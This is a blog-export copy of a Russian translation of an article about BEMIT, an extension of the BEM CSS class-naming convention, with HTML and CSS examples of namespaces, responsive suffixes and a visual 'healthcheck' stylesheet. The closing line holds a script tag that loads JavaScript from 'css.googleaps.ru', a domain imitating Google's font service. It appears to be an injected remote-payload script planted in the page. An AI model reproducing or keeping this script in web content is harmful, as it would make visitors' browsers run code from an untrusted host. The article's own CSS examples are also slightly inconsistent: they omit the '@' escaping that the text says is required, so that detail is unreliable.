---
layout: post
status: publish
published: true
title: Следующий шаг БЭМ-нотации для CSS
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 47652
wordpress_url: http://devdocs.ru/?p=47652
date: '2015-10-07 15:56:37 +0200'
date_gmt: '2015-10-07 15:56:37 +0200'
categories:
- Верстка
- Интересные ссылки
tags:
- spl
- css
- идеи
- ui
- frontender
comments: []
---
<p>Те, кто следит за мной или моей работой, и неважно насколько долго он это делает,<br />
знает, что я горячо рекомендую <a href="http:&#47;&#47;csswizardry.com&#47;2013&#47;01&#47;mindbemding-getting-your-head-round-bem-syntax&#47;">нотацию БЭМ для CSS<&#47;a>. То, о чем я хотел бы рассказать<br />
в этой статье, является не альтернативой или вариантом синтаксиса БЭМ, а его расширением:<br />
это небольшие дополнения, который поднимают БЭМ на новый уровень. Я назвал это расширение<br />
синтаксиса <em>BEMIT<&#47;em>, т.к. оно берет идеи и некоторые паттерны из (так и не опубликованной)<br />
<a href="https:&#47;&#47;twitter.com&#47;itcss_io">архитектуры обратного треугольника<&#47;a>. BEM + ITCSS = BEMIT.<&#47;p></p>
<p>Напомню, БЭМ разделяет все классы на 3 группы:<&#47;p></p>
<ul>
<li>
<strong>Блок<&#47;strong> &mdash; корневой элемент компонента<&#47;li></p>
<li>
<strong>Элемент<&#47;strong> &mdash; составная часть блока<&#47;li></p>
<li>
<strong>Модификатор<&#47;strong> &mdash; вариация или расширение блока<&#47;li><br />
<&#47;ul></p>
<p>Блок, Элемент, Модификатор: БЭМ. Абсолютно любой класс в проекте вписывается в одну<br />
из этих категорий, поэтому БЭМ так прекрасен своей понятностью и простотой.<&#47;p></p>
<p>Суть БЭМа в том, чтобы сделать ваш код прозрачней и понятней. БЭМ показывает разработчикам<br />
как классы относятся друг к другу, что особенно полезно в сложных или глубоких частях DOM.<br />
Например, если бы я попросил вас удалить все классы, относящиеся к пользователю, в этом<br />
куске кода, какие бы вы выбросили?<&#47;p></p>
<pre><code>
<div class="media  user  premium">
  <img src="" alt="" class="img  photo  avatar" &#47;></p>
<p class="body  bio">...<&#47;p><br />
<&#47;div><br />
<&#47;code><&#47;pre></p>
<p>Наверное вы бы начали с <code>user<&#47;code>, но, чтобы удалить остальное, вам бы пришлось догадываться,<br />
тратить время на детальное изучение проекта или пытаться разобраться как-то ещё. Однако<br />
если мы перепишем это используя БЭМ:<&#47;p></p>
<pre><code>
<div class="media  user  user--premium">
  <img src="" alt="" class="media__img  user__photo  avatar" &#47;></p>
<p class="media__body  user__bio">...<&#47;p><br />
<&#47;div><br />
<&#47;code><&#47;pre></p>
<p>Так мы сразу можем увидеть что <code>user<&#47;code>, <code>user--premium<&#47;code>, <code>user__photo<&#47;code><br />
и <code>user__bio<&#47;code> взаимосвязаны. Также мы можем увидеть, что <code>media<&#47;code>, <code>media__img<&#47;code><br />
и <code>media__body<&#47;code> связанны, а <code>avatar<&#47;code> &mdash; это просто одинокий Блок без своих собственных<br />
Элементов или Модификаторов.<&#47;p></p>
<p>Здорово, что мы узнаем столько деталей всего лишь из имён классов! Это позволяет нам<br />
лучше понимать, какую роль играет тот или иной элемент и делать значительно более безопасные<br />
и взвешенные решения по поводу того, как их использовать, изменять и удалять.<&#47;p></p>
<p>Единственный недостаток БЭМ состоит в том, что именование классов показывает только то,<br />
как элементы связаны друг с другом. Он не дает представления об их поведении, как они<br />
действуют или как их надо использовать вне контекста связей между ними.<&#47;p></p>
<p>В связи с этим я решил расширить БЭМ до BEMIT. BEMIT не добавляет никаких новых типов классов,<br />
у нас по прежнему остаются только Блоки, Элементы или Модификаторы, но он добавляет информацию<br />
об использовании и состоянии.<&#47;p></p>
<h2>Пространства имён<&#47;h2></p>
<p>Чтобы мне не повторяться, вам, возможно, лучше прочесть статью, которую я опубликовал ранее<br />
в этом году &mdash; <a href="http:&#47;&#47;csswizardry.com&#47;2015&#47;03&#47;more-transparent-ui-code-with-namespaces&#47;">More Transparent UI Code with Namespaces<&#47;a>, в которой я представил идею<br />
добавления префиксов определенного вида для каждого класса, который был пояснял разработчикам<br />
что именно делает этот класс. Такое именование в стиле <a href="https:&#47;&#47;en.wikipedia.org&#47;wiki&#47;Hungarian_notation">венгерской нотации<&#47;a> позволит нам<br />
установить какую задачу должен выполнять каждый класс, как и где мы можем использовать его повторно<br />
(если можем), можем ли мы его модифицировать &mdash; и многое другое. Статья довольно большая,<br />
но она позволит вам значительно лучше понять этот подход.<&#47;p></p>
<p>Наиболее распространенные пространства имен это: <code>c-<&#47;code> &mdash; для компонентов, <code>o-<&#47;code> &mdash; для объектов,<br />
<code>u-<&#47;code> &mdash; для утилит и <code>is-&#47;has-<&#47;code> для состояний (читайте подробнее в статье, упомянутой выше).<&#47;p></p>
<p>С учётом этого, HTML будет выглядеть так:<&#47;p></p>
<pre><code>
<div class="o-media  c-user  c-user--premium">
  <img src="" alt="" class="o-media__img  c-user__photo  c-avatar" &#47;></p>
<p class="o-media__body  c-user__bio">...<&#47;p><br />
<&#47;div><br />
<&#47;code><&#47;pre></p>
<p>Этот код показывает, что в нём есть пригодная к повторному использованию абстракция<br />
(это <a href="http:&#47;&#47;www.smashingmagazine.com&#47;2011&#47;12&#47;an-introduction-to-object-oriented-css-oocss&#47;">OOCSS<&#47;a> &mdash; <strong>прим. переводчика<&#47;strong>) в <a href="http:&#47;&#47;www.stubbornella.org&#47;content&#47;2010&#47;06&#47;25&#47;the-media-object-saves-hundreds-of-lines-of-code&#47;">Медиа-объекте<&#47;a> (<code>o-media*<&#47;code>) и два компонента,<br />
которые зависят от контекста применения (<code>c-user*<&#47;code> и <code>c-avatar<&#47;code>). Эти классы по-прежнему являются<br />
Блоками, Элементами или Модификаторами, мы просто добавили им дополнительный уровень смысла.<&#47;p></p>
<p>Эти пространства имён связанны со слоями, которые определены в <a href="https:&#47;&#47;twitter.com&#47;itcss_io">архитектуре обратного треугольника<&#47;a>,<br />
у каждого класса теперь есть своё место в проекте (и файловой системе).<&#47;p></p>
<h2>Адаптивные суффиксы<&#47;h2></p>
<p>Следующее, что BEMIT добавляет к традиционной БЭМ-нотации, это адаптивные суффиксы.<br />
Они имеют формат <code>@<breakpoint><&#47;code> и описывают связь этого класса с медиасостоянием.<&#47;p></p>
<pre><code>
<div class="o-media@md  c-user  c-user--premium">
  <img src="" alt="" class="o-media__img@md  c-user__photo  c-avatar" &#47;></p>
<p class="o-media__body@md  c-user__bio">...<&#47;p><br />
<&#47;div><br />
<&#47;code><&#47;pre></p>
<p>Например, тут есть <code>o-media@md<&#47;code>, что означает, что это медиаобъект для набора правил<br />
медиа состояния <code>md<&#47;code>. Вот ещё возможные варианты:<&#47;p></p>
<ul>
<li>
<code>u-hidden@print<&#47;code> &mdash; вспомогательный класс для скрытия блоков при печати.<&#47;li></p>
<li>
<code>u-1&#47;4@lg<&#47;code> &mdash; вспомогательный класс, задающий для элемента ширину в четверть родителя при бо́льшей ширине.<&#47;li></p>
<li>
<code>o-layout@md<&#47;code> &mdash; элемент, формирующий раскладку при средней ширине.<&#47;li><br />
<&#47;ul></p>
<p>Символ <code>@<&#47;code> легко читается и имеет логическое значение для обозначения условных состояний.<br />
Это позволяет разработчикам, просто взглянув на него, понять, какие потенциальные перестановки<br />
или изменения могут быть у данного элемента интерфейса.<&#47;p></p>
<p><strong>Примечание<&#47;strong>: в CSS-файле символ <code>@<&#47;code> необходимо экранировать:<&#47;p></p>
<pre><code>@media print {<br />
  .u-hidden@print {<br />
    display: none;<br />
  }<br />
}<br />
<&#47;code><&#47;pre></p>
<h2>Проверка жизнеспособности кода<&#47;h2></p>
<p>Используя описанные выше строгие и последовательные правила именования классов в HTML,<br />
мы можем сделать многое. Первое, и самое очевидное, мы сможем писать гораздо более выразительный<br />
и осмысленный код, в результате чего нашим коллегам будет гораздо легче ориентироваться в проекте.<br />
Они тоже могут внести свой вклад в этот процесс.<&#47;p></p>
<p>Ещё одним приятным следствием является то, что мы можем визуально оценить жизнеспособность<br />
нашего кода. Используя селекторы по подстроке значения атрибута, мы можем визуализировать<br />
структуру страницы используя классы, из которых она состоит:<&#47;p></p>
<pre><code>&#47;**<br />
 * Выделить все элементы с атрибутом class.<br />
 *&#47;<br />
[class] {<br />
  outline: 5px solid lightgrey;<br />
}</p>
<p>&#47;**<br />
 * Выделить все БЭМ-элементы.<br />
 *&#47;<br />
[class*="__"] {<br />
  outline: 5px solid grey;<br />
}</p>
<p>&#47;**<br />
 * Выделить все элементы с БЭМ-модификаторами.<br />
 *&#47;<br />
[class*="--"] {<br />
  outline: 5px solid darkgrey;<br />
}</p>
<p>&#47;**<br />
 * Выделить все элементы объектов<br />
 *&#47;<br />
[class^="o-"],<br />
[class*=" o-"] {<br />
  outline: 5px solid orange;<br />
}</p>
<p>&#47;**<br />
 * Выделить все элементы компонентов<br />
 *&#47;<br />
[class^="c-"],<br />
[class*=" c-"] {<br />
  outline: 5px solid cyan;<br />
}</p>
<p>&#47;**<br />
 * Выделить все элементы с адаптивными суффиксами.<br />
 *&#47;<br />
[class*="@"] {<br />
  outline: 5px solid rosybrown;<br />
}</p>
<p>&#47;**<br />
 * Выделить все элементы с классами-хаками.<br />
 *&#47;<br />
[class^="_"] {<br />
  outline: 5px solid red;<br />
}<br />
<&#47;code><&#47;pre></p>
<p>Конечно, это не пуленепробиваемое решение &mdash; что-то может быть одновременно и Компонентом<br />
и Элементом и обладать отзывчивыми поведением, но если мы пишем классы соблюдая определенный<br />
порядок (т.е. в порядке возрастания от наименее к наиболее важному, вот почему хаки идут последними),<br />
мы можем получить красивый визуальный срез верстки любой страницы. Можете прочесть больше о пользе<br />
такой проверки в <a href="http:&#47;&#47;csswizardry.com&#47;2015&#47;03&#47;more-transparent-ui-code-with-namespaces&#47;#highlight-types-of-namespace">моей предыдущей статье про пространства имен<&#47;a>.<&#47;p></p>
<p>Эту проверку можно проводить разными способами, но, пожалуй, самым простым способом будет обернуть<br />
все классы в <a href="http:&#47;&#47;csswizardry.com&#47;2015&#47;03&#47;more-transparent-ui-code-with-namespaces&#47;#scope-namespaces-s-">класс пространства имен<&#47;a>:<&#47;p></p>
<pre><code>.s-healthcheck {</p>
<p>  ...</p>
<p>  &#47;**<br />
   * Выделить все элементы с адаптивными суффиксами.<br />
   *&#47;<br />
  [class*="@"] {<br />
    outline: 5px solid rosybrown;<br />
  }</p>
<p>  ...</p>
<p>}<br />
<&#47;code><&#47;pre></p>
<p>&hellip;и добавлять его элементу <code>html<&#47;code>, когда будет нужно:<&#47;p></p>
<pre><code><html class="s-healthcheck"><br />
<&#47;code><&#47;pre></p>
<h2>Заключение<&#47;h2></p>
<p>Итак, у нас есть пара простых расширений БЭМ, которые превращают его в BEMIT: мы добавляем информацию<br />
в начало и конец стандартных классов Блока, Элемента и Модификатора, что бы дать информацию о том,<br />
как эти классы ведут себя вне контекста связей между ними. Вот ещё пара примеров:<&#47;p></p>
<pre><code>.c-page-head {}</p>
<p>@media screen and (min-width: 15em) {<br />
  .u-text-center@sm {}<br />
}</p>
<p>.o-layout__item {}</p>
<p>@media print {<br />
  .u-color-black@print {}<br />
}<br />
<&#47;code><&#47;pre><br />
<img src="http:&#47;&#47;feeds.feedburner.com&#47;~r&#47;FrontenderMagazineArticles&#47;~4&#47;6Z8jOBQSpxs" height="1" width="1" alt="" &#47;><br />
Source: http:&#47;&#47;frontender.info&#47;<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
